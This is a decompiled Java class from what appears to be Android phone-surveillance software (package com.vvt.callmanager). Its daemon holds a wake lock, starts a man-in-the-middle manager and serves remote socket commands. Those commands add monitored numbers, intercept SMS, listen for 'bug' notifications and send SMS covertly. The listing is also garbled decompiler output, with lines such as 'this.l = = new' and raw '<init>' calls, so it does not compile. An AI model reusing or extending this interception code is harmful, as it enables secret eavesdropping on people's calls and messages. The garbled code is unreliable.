package com.vvt.callmanager;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import com.fx.daemon.exception.RunningException;
import com.fx.socket.FxSocketException;
import com.fx.socket.SocketCmd;
import com.fx.socket.command.RemoteCheckAlive;
import com.fx.socket.command.RemoteCheckSync;
import com.fx.socket.command.RemoteSetSync;
import com.fx.socket.command.RemoteSetSync.SyncData;
import com.fx.socket.command.RemoteShutdownRequest;
import com.vvt.base.communication.SmsInterceptInfo;
import com.vvt.callmanager.mitm.MitmManager;
import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.SmsMessage;
import com.vvt.callmanager.ref.command.RemoteAddMonitor;
import com.vvt.callmanager.ref.command.RemoteAddSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteGetMonitorList;
import com.vvt.callmanager.ref.command.RemoteGetSmsInterceptList;
import com.vvt.callmanager.ref.command.RemoteListenBugNotification;
import com.vvt.callmanager.ref.command.RemotePurgePendingSmsCommands;
import com.vvt.callmanager.ref.command.RemoteRemoveAllMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveAllSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteRemoveMonitor;
import com.vvt.callmanager.ref.command.RemoteRemoveSmsIntercept;
import com.vvt.callmanager.ref.command.RemoteSendSms;
import com.vvt.callmanager.ref.f;

import java.util.HashMap;
import java.util.Set;
import java.util.concurrent.Callable;

/**
 *
 */
public class CallMgrDaemonMain implements com.fx.socket.a {
    private final boolean a;
    private final boolean b;
    private final boolean c;
    private f d;
    private ContentResolver e;
    private Context f;
    private HashMap g;
    private Looper h;
    private MitmManager i;
    private com.fx.socket.b j;
    private PowerManager.WakeLock k;
    private Callable l;

    public CallMgrDaemonMain() {
        boolean bool = g.a;
        this.a = bool;
        bool = g.b;
        this.b = bool;
        bool = g.e;
        this.c = bool;
        this.l = = new com.vvt.callmanager.b(this);
    }

    private void a() {
        boolean bool1 = this.b;
        if (bool1) {}
        Object localObject3;
        try {
            bool1 = this.b;
            if (bool1) {}
            com.vvt.c.a.a();
            boolean bool2 = j.a("callmgrd");
            if (bool2) {
                localObject1 = new com/fx/daemon/exception/RunningException;
                localObject3 = "Daemon is already running";
                ((RunningException)localObject1).<init>((String)localObject3);
                throw ((Throwable)localObject1);
            }
        }
        catch (RunningException localRunningException) {
            bool1 = this.c;
            if (bool1) {}
            b();
        }

        for (;;) {
            bool1 = this.b;
            if (bool1) {}
            return;
            com.fx.daemon.b.b(localRunningException);
            bool1 = this.b;
            if (bool1) {}
            Object localObject2 = "CallMgrDaemonMain";
            com.fx.daemon.b.a((String)localObject2);
            bool1 = this.b;
            if (bool1) {}
            Looper.prepareMainLooper();
            localObject2 = Looper.myLooper();
            this.h = ((Looper)localObject2);
            bool1 = this.b;
            if (bool1) {}
            localObject2 = com.fx.daemon.b.a();
            this.f = ((Context)localObject2);
            localObject2 = this.f;
            localObject2 = ((Context)localObject2).getContentResolver();
            this.e = ((ContentResolver)localObject2);
            bool1 = this.b;
            if (bool1) {}
            localObject2 = this.f;
            a((Context)localObject2);
            bool1 = this.b;
            if (bool1) {}
            d();
            bool1 = this.b;
            if (bool1) {}
            localObject2 = this.f;
            localObject2 = MitmManager.getInstance((Context)localObject2);
            this.i = ((MitmManager)localObject2);
            localObject2 = this.i;
            ((MitmManager)localObject2).a();
            long l1 = 3000L;
            SystemClock.sleep(l1);
            bool1 = this.b;
            if (bool1) {}
            localObject2 = this.f;
            localObject2 = ((Context)localObject2).getContentResolver();
            localObject3 = com.vvt.callmanager.ref.c.b;
            String str = null;
            ((ContentResolver)localObject2).notifyChange((Uri)localObject3, null);
            localObject2 = new com/fx/daemon/a/c;
            localObject3 = "CallMgrDaemonMain";
            str = com.vvt.a.a.c;
            Callable localCallable = this.l;
            ((com.fx.daemon.a.c)localObject2).<init>((String)localObject3, str, localCallable);
            Thread.setDefaultUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)localObject2);
            bool1 = this.b;
            if (bool1) {}
            Looper.loop();
        }
    }

    private void a(Context paramContext)
    {
        Object localObject = (PowerManager)paramContext.getSystemService("power");
        PowerManager.WakeLock localWakeLock = this.k;
        int m;
        if (localWakeLock != null)
        {
            localWakeLock = this.k;
            m = localWakeLock.isHeld();
            if (m != 0) {}
        }
        else
        {
            m = 1;
            String str = "CallMgrDaemonMain";
            localObject = ((PowerManager)localObject).newWakeLock(m, str);
            this.k = ((PowerManager.WakeLock)localObject);
            localObject = this.k;
            ((PowerManager.WakeLock)localObject).acquire();
        }
        localObject = this.k;
        if (localObject != null)
        {
            localObject = this.k;
            boolean bool = ((PowerManager.WakeLock)localObject).isHeld();
            if (bool) {}
        }
        else
        {
            localObject = new com/fx/daemon/exception/RunningException;
            ((RunningException)localObject).<init>("Cannot acquire WakeLock");
            throw ((Throwable)localObject);
        }
    }

    private boolean a(String paramString, RemoteSetSync.SyncData paramSyncData)
    {
        Object localObject = this.g;
        if (localObject == null)
        {
            localObject = new java/util/HashMap;
            ((HashMap)localObject).<init>();
            this.g = ((HashMap)localObject);
        }
        localObject = this.g.put(paramString, paramSyncData);
        boolean bool;
        if (localObject == null) {
            bool = true;
        }
        for (;;)
        {
            return bool;
            bool = false;
            localObject = null;
        }
    }

    private boolean a(String paramString1, String paramString2)
    {
        boolean bool1 = false;
        MitmManager localMitmManager1 = null;
        MitmManager localMitmManager2 = this.i;
        if (localMitmManager2 != null)
        {
            localMitmManager1 = this.i;
            bool1 = localMitmManager1.a(paramString1, paramString2);
        }
        for (;;)
        {
            return bool1;
            boolean bool2 = this.c;
            if (!bool2) {}
        }
    }

    private void b()
    {
        ContentResolver localContentResolver = this.e;
        if (localContentResolver != null)
        {
            bool = this.b;
            if (bool) {}
            localContentResolver = this.e;
            Uri localUri = com.vvt.callmanager.ref.c.b;
            localContentResolver.notifyChange(localUri, null);
        }
        boolean bool = this.b;
        if (bool) {}
        j.a();
    }

    private void c()
    {
        Object localObject = this.j;
        boolean bool;
        if (localObject != null)
        {
            bool = this.a;
            if (bool) {}
            localObject = this.j;
            ((com.fx.socket.b)localObject).a();
        }
        for (;;)
        {
            bool = this.b;
            if (bool) {}
            j.a();
            return;
            localObject = this.h;
            if (localObject != null)
            {
                bool = this.a;
                if (bool) {}
                localObject = this.h;
                ((Looper)localObject).quit();
            }
        }
    }

    private void d()
    {
        boolean bool = this.a;
        if (bool) {}
        try
        {
            com.fx.socket.b localb = new com/fx/socket/b;
            String str1 = "CallMgrDaemonMain";
            String str2 = "com.fx.socket.callmgrd";
            localb.<init>(str1, str2, this);
            this.j = localb;
            localb = this.j;
            localb.start();
            return;
        }
        catch (FxSocketException localFxSocketException)
        {
            bool = this.c;
            if (bool) {}
            RunningException localRunningException = new com/fx/daemon/exception/RunningException;
            localRunningException.<init>("Socket server setup failed");
            throw localRunningException;
        }
    }

    public static void main(String[] paramArrayOfString) {
        String str = com.vvt.a.a.c;
        com.fx.daemon.b.a("CallMgrDaemonMain", str, "fx.log");
        CallMgrDaemonMain localCallMgrDaemonMain = new com.vvt.callmanager.CallMgrDaemonMain();
        localCallMgrDaemonMain.a();
    }

    public Object a(SocketCmd paramSocketCmd) {
        boolean bool1 = true;
        boolean bool2 = this.a;
        if (bool2) {}
        Object localObject1 = this.d;
        if (localObject1 == null)
        {
            localObject1 = f.a();
            this.d = ((f)localObject1);
        }
        bool2 = false;
        localObject1 = null;
        boolean bool3 = paramSocketCmd instanceof RemoteCheckAlive;
        if (bool3)
        {
            bool2 = this.a;
            if (bool2) {}
            localObject1 = Boolean.valueOf(bool1);
        }
        for (;;)
        {
            bool1 = this.a;
            if (bool1) {}
            return localObject1;
            bool3 = paramSocketCmd instanceof RemoteCheckSync;
            Object localObject2;
            if (bool3)
            {
                bool2 = this.a;
                if (bool2) {}
                paramSocketCmd = (RemoteCheckSync)paramSocketCmd;
                localObject1 = (String)paramSocketCmd.getData();
                localObject2 = this.g;
                if (localObject2 != null)
                {
                    localObject2 = this.g.keySet();
                    bool2 = ((Set)localObject2).contains(localObject1);
                    if (bool2) {
                        bool2 = bool1;
                    }
                }
                for (;;)
                {
                    localObject1 = Boolean.valueOf(bool2);
                    break;
                    bool2 = false;
                    localObject1 = null;
                }
            }
            bool3 = paramSocketCmd instanceof RemoteSetSync;
            Object localObject3;
            if (bool3)
            {
                bool2 = this.a;
                if (bool2) {}
                paramSocketCmd = (RemoteSetSync)paramSocketCmd;
                localObject1 = (RemoteSetSync.SyncData)paramSocketCmd.getData();
                localObject3 = ((RemoteSetSync.SyncData)localObject1).getClientPackage();
                bool2 = a((String)localObject3, (RemoteSetSync.SyncData)localObject1);
                localObject1 = Boolean.valueOf(bool2);
            }
            else
            {
                bool3 = paramSocketCmd instanceof RemoteAddMonitor;
                if (bool3)
                {
                    bool2 = this.b;
                    if (bool2) {}
                    paramSocketCmd = (RemoteAddMonitor)paramSocketCmd;
                    localObject1 = (MonitorNumber)paramSocketCmd.getData();
                    bool1 = this.b;
                    if (bool1) {}
                    localObject3 = this.d;
                    bool2 = ((f)localObject3).a((MonitorNumber)localObject1);
                    localObject1 = Boolean.valueOf(bool2);
                    bool1 = this.b;
                    if (!bool1) {}
                }
                else
                {
                    bool3 = paramSocketCmd instanceof RemoteRemoveMonitor;
                    if (bool3)
                    {
                        bool2 = this.b;
                        if (bool2) {}
                        paramSocketCmd = (RemoteRemoveMonitor)paramSocketCmd;
                        localObject1 = (MonitorNumber)paramSocketCmd.getData();
                        bool1 = this.b;
                        if (bool1) {}
                        localObject3 = this.d;
                        bool2 = ((f)localObject3).b((MonitorNumber)localObject1);
                        localObject1 = Boolean.valueOf(bool2);
                        bool1 = this.b;
                        if (!bool1) {}
                    }
                    else
                    {
                        bool3 = paramSocketCmd instanceof RemoteRemoveAllMonitor;
                        if (bool3)
                        {
                            bool2 = this.b;
                            if (bool2) {}
                            paramSocketCmd = (RemoteRemoveAllMonitor)paramSocketCmd;
                            localObject1 = (String)paramSocketCmd.getData();
                            bool1 = this.b;
                            if (bool1) {}
                            localObject3 = this.d;
                            bool2 = ((f)localObject3).d((String)localObject1);
                            localObject1 = Boolean.valueOf(bool2);
                            bool1 = this.b;
                            if (!bool1) {}
                        }
                        else
                        {
                            bool3 = paramSocketCmd instanceof RemoteGetMonitorList;
                            if (bool3)
                            {
                                bool2 = this.b;
                                if (bool2) {}
                                paramSocketCmd = (RemoteGetMonitorList)paramSocketCmd;
                                localObject1 = (String)paramSocketCmd.getData();
                                bool1 = this.b;
                                if (bool1) {}
                                localObject3 = this.d;
                                localObject1 = ((f)localObject3).c((String)localObject1);
                                bool1 = this.b;
                                if (!bool1) {}
                            }
                            else
                            {
                                bool3 = paramSocketCmd instanceof RemoteAddSmsIntercept;
                                if (bool3)
                                {
                                    bool2 = this.b;
                                    if (bool2) {}
                                    paramSocketCmd = (RemoteAddSmsIntercept)paramSocketCmd;
                                    localObject1 = (SmsInterceptInfo)paramSocketCmd.getData();
                                    bool1 = this.b;
                                    if (bool1) {}
                                    localObject3 = this.d;
                                    bool2 = ((f)localObject3).a((SmsInterceptInfo)localObject1);
                                    localObject1 = Boolean.valueOf(bool2);
                                    bool1 = this.b;
                                    if (!bool1) {}
                                }
                                else
                                {
                                    bool3 = paramSocketCmd instanceof RemoteRemoveSmsIntercept;
                                    if (bool3)
                                    {
                                        bool2 = this.b;
                                        if (bool2) {}
                                        paramSocketCmd = (RemoteRemoveSmsIntercept)paramSocketCmd;
                                        localObject1 = (SmsInterceptInfo)paramSocketCmd.getData();
                                        bool1 = this.b;
                                        if (bool1) {}
                                        localObject3 = this.d;
                                        bool2 = ((f)localObject3).a((SmsInterceptInfo)localObject1);
                                        localObject1 = Boolean.valueOf(bool2);
                                        bool1 = this.b;
                                        if (!bool1) {}
                                    }
                                    else
                                    {
                                        bool3 = paramSocketCmd instanceof RemoteRemoveAllSmsIntercept;
                                        if (bool3)
                                        {
                                            bool2 = this.b;
                                            if (bool2) {}
                                            paramSocketCmd = (RemoteRemoveAllSmsIntercept)paramSocketCmd;
                                            localObject1 = (String)paramSocketCmd.getData();
                                            bool1 = this.b;
                                            if (bool1) {}
                                            localObject3 = this.d;
                                            bool2 = ((f)localObject3).f((String)localObject1);
                                            localObject1 = Boolean.valueOf(bool2);
                                            bool1 = this.b;
                                            if (!bool1) {}
                                        }
                                        else
                                        {
                                            bool3 = paramSocketCmd instanceof RemoteGetSmsInterceptList;
                                            if (bool3)
                                            {
                                                bool2 = this.b;
                                                if (bool2) {}
                                                paramSocketCmd = (RemoteGetSmsInterceptList)paramSocketCmd;
                                                localObject1 = (String)paramSocketCmd.getData();
                                                bool1 = this.b;
                                                if (bool1) {}
                                                localObject3 = this.d;
                                                localObject1 = ((f)localObject3).e((String)localObject1);
                                                bool1 = this.b;
                                                if (!bool1) {}
                                            }
                                            else
                                            {
                                                bool3 = paramSocketCmd instanceof RemoteListenBugNotification;
                                                if (bool3)
                                                {
                                                    bool2 = this.b;
                                                    if (bool2) {}
                                                    paramSocketCmd = (RemoteListenBugNotification)paramSocketCmd;
                                                    localObject1 = (BugNotification)paramSocketCmd.getData();
                                                    bool1 = this.b;
                                                    if (bool1) {}
                                                    localObject3 = this.d;
                                                    bool2 = ((f)localObject3).a((BugNotification)localObject1);
                                                    localObject1 = Boolean.valueOf(bool2);
                                                }
                                                else
                                                {
                                                    bool3 = paramSocketCmd instanceof RemoteSendSms;
                                                    if (bool3)
                                                    {
                                                        bool2 = this.b;
                                                        if (bool2) {}
                                                        paramSocketCmd = (RemoteSendSms)paramSocketCmd;
                                                        localObject1 = (SmsMessage)paramSocketCmd.getData();
                                                        localObject3 = ((SmsMessage)localObject1).getPhoneNumber();
                                                        localObject1 = ((SmsMessage)localObject1).getMessage();
                                                        bool2 = a((String)localObject3, (String)localObject1);
                                                        localObject1 = Boolean.valueOf(bool2);
                                                    }
                                                    else
                                                    {
                                                        bool3 = paramSocketCmd instanceof RemotePurgePendingSmsCommands;
                                                        if (bool3)
                                                        {
                                                            bool2 = this.b;
                                                            if (bool2) {}
                                                            bool2 = this.i.b();
                                                            localObject1 = Boolean.valueOf(bool2);
                                                        }
                                                        else
                                                        {
                                                            bool3 = paramSocketCmd instanceof RemoteShutdownRequest;
                                                            if (bool3)
                                                            {
                                                                bool2 = this.a;
                                                                if (bool2) {}
                                                                localObject1 = new java/lang/Thread;
                                                                localObject2 = new com/vvt/callmanager/a;
                                                                ((a)localObject2).<init>(this);
                                                                ((Thread)localObject1).<init>((Runnable)localObject2);
                                                                ((Thread)localObject1).start();
                                                                localObject1 = Boolean.valueOf(bool1);
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/CallMgrDaemonMain.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */